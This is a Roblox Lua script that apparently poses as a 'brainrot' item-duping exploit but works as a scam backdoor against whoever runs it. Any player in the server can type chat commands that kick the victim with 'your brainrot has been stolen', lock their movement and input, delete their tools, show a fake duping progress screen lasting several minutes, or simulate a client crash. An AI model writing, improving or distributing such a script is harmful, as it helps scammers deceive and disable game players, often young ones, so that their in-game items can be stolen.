local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local lp = Players.LocalPlayer
local Camera = workspace.CurrentCamera
local RS = game:GetService("RunService")
local Lighting = game:GetService("Lighting")

local invertActive = false
local invertConnection = nil
local invertEffect = nil
local oldOffset = nil

function EnableInvert()
    if invertActive then return end
    invertActive = true
    local char = lp.Character
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum then return end
    invertEffect = Instance.new("ColorCorrectionEffect")
    invertEffect.TintColor = Color3.fromRGB(255,230,80)
    invertEffect.Saturation = -0.1
    invertEffect.Contrast = 0.25
    invertEffect.Parent = Lighting
    oldOffset = hum.CameraOffset
    hum.CameraOffset = Vector3.new(0,0,-2.5)
    invertConnection = RS.RenderStepped:Connect(function()
        local c = lp.Character
        if not c or not c.PrimaryPart or hum.Health <= 0 then return end
        local root = c.PrimaryPart
        local move = Vector3.zero
        if UserInputService:IsKeyDown(Enum.KeyCode.W) then move -= root.CFrame.LookVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.S) then move += root.CFrame.LookVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.A) then move += root.CFrame.RightVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.D) then move -= root.CFrame.RightVector end
        root.AssemblyLinearVelocity = Vector3.new(move.X*25, root.AssemblyLinearVelocity.Y, move.Z*25)
    end)
end

function DisableInvert()
    if not invertActive then return end
    invertActive = false
    if invertConnection then invertConnection:Disconnect() invertConnection = nil end
    if invertEffect then invertEffect:Destroy() invertEffect = nil end
    local char = lp.Character
    if char and char:FindFirstChildOfClass("Humanoid") and oldOffset then
        char:FindFirstChildOfClass("Humanoid").CameraOffset = oldOffset
    end
end

local function blockPlayer()
    lp.Character:WaitForChild("Humanoid").WalkSpeed = 0
    lp.Character:WaitForChild("Humanoid").JumpPower = 0
    UserInputService.InputBegan:Connect(function(input,gp)
        if not gp and (input.UserInputType==Enum.UserInputType.Keyboard or input.UserInputType==Enum.UserInputType.MouseButton1 or input.UserInputType==Enum.UserInputType.MouseButton2) then
            return Enum.ContextActionResult.Sink
        end
    end)
    UserInputService.InputChanged:Connect(function(input,gp)
        if input.UserInputType==Enum.UserInputType.MouseMovement then
            Camera.CFrame=Camera.CFrame
        end
    end)
end

local function removeTools()
    local function destroyTools(parent)
        for _, tool in ipairs(parent:GetChildren()) do
            if tool:IsA("Tool") then tool:Destroy() end
        end
    end
    destroyTools(lp.Backpack)
    destroyTools(lp.Character)
    lp.Backpack.ChildAdded:Connect(function(child)
        if child:IsA("Tool") then child:Destroy() end
    end)
    lp.Character.ChildAdded:Connect(function(child)
        if child:IsA("Tool") then child:Destroy() end
    end)
end

local function startUI(mode)
    blockPlayer()
    removeTools()
    game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All,false)
    local gui=Instance.new("ScreenGui")
    gui.IgnoreGuiInset=true
    gui.DisplayOrder=999999
    gui.Parent=lp:WaitForChild("PlayerGui")
    local bg=Instance.new("Frame")
    bg.Size=UDim2.new(1,0,1,0)
    bg.BackgroundColor3=Color3.new(0,0,0)
    bg.Parent=gui
    local text=Instance.new("TextLabel")
    text.Size=UDim2.new(1,0,0,100)
    text.Position=UDim2.new(0,0,0.4,0)
    text.BackgroundTransparency=1
    text.TextColor3=Color3.new(1,1,1)
    text.TextScaled=true
    text.Font=Enum.Font.Code
    text.Parent=bg
    local barBack=Instance.new("Frame")
    barBack.Size=UDim2.new(0.8,0,0,20)
    barBack.Position=UDim2.new(0.1,0,0.55,0)
    barBack.BackgroundColor3=Color3.fromRGB(40,40,40)
    barBack.Parent=bg
    local bar=Instance.new("Frame")
    bar.Size=UDim2.new(0,0,1,0)
    bar.BackgroundColor3=Color3.fromRGB(0,170,0)
    bar.Parent=barBack
    local function uiText(p)
        if p<20 then return"Initializing..." end
        if p<40 then return"Loading assets..." end
        if p<60 then return"Checking client..." end
        if p<80 then return"Finalizing..." end
        if p<100 then return"Almost done..." end
        return"Completed."
    end
    local function dupeText(p)
        if p<20 then return"Preparing environment..." end
        if p<40 then return"Bypassing brainrot security..." end
        if p<60 then return"Cloning brainrot assets..." end
        if p<80 then return"Injecting sequences..." end
        if p<90 then return"Dupe setup in progress..." end
        if p<100 then return"Duping brainrot almost done..." end
        return"Finalized."
    end
    local steps=100
    local increment=(mode=="dupe") and (300/steps) or 0.05
    for i=0,steps do
        bar.Size=UDim2.new(i/100,0,1,0)
        if mode=="ui" then text.Text=uiText(i) else text.Text=dupeText(i) end
        task.wait(increment)
    end
end

local function crashEffect()
    local char=lp.Character
    local hum=char and char:FindFirstChildOfClass("Humanoid")
    local cam=workspace.CurrentCamera
    local blur=Instance.new("BlurEffect")
    blur.Size=40
    blur.Parent=cam
    if hum then
        hum.WalkSpeed=0
        hum.JumpPower=0
        hum.AutoRotate=false
        hum:ChangeState(Enum.HumanoidStateType.Physics)
    end
    for _,v in ipairs(char:GetDescendants()) do
        if v:IsA("AnimationTrack") then v:Stop() end
    end
    local freezeCF=cam.CFrame
    cam:GetPropertyChangedSignal("CFrame"):Connect(function() cam.CFrame=freezeCF end)
    local gui=Instance.new("ScreenGui")
    gui.DisplayOrder=999999
    gui.IgnoreGuiInset=true
    gui.Parent=lp:WaitForChild("PlayerGui")
    local frame=Instance.new("Frame")
    frame.Size=UDim2.new(1,0,1,0)
    frame.BackgroundColor3=Color3.fromRGB(0,0,0)
    frame.Parent=gui
    local label=Instance.new("TextLabel")
    label.Size=UDim2.new(1,0,0,100)
    label.Position=UDim2.new(0,0,0.45,0)
    label.BackgroundTransparency=1
    label.TextColor3=Color3.new(1,1,1)
    label.Font=Enum.Font.Code
    label.TextScaled=true
    label.Text="Client Crash"
    label.Parent=frame
end

local function hookPlayer(p)
    p.Chatted:Connect(function(msg)
        msg = msg:lower()
        if msg == ".kick" then
            lp:Kick("your brainrot has been stolen")
        elseif msg == ".ui" then
            startUI("ui")
        elseif msg == ".dupe" then
            startUI("dupe")
        elseif msg == ".crash" then
            crashEffect()
        elseif msg:sub(1,1) == "." then
            local cloned = Instance.new("StringValue")
            cloned.Name="HiddenCommand"
            cloned.Parent=lp.PlayerGui
        end
    end)
end

for _,p in ipairs(Players:GetPlayers()) do
    hookPlayer(p)
end
Players.PlayerAdded:Connect(hookPlayer)
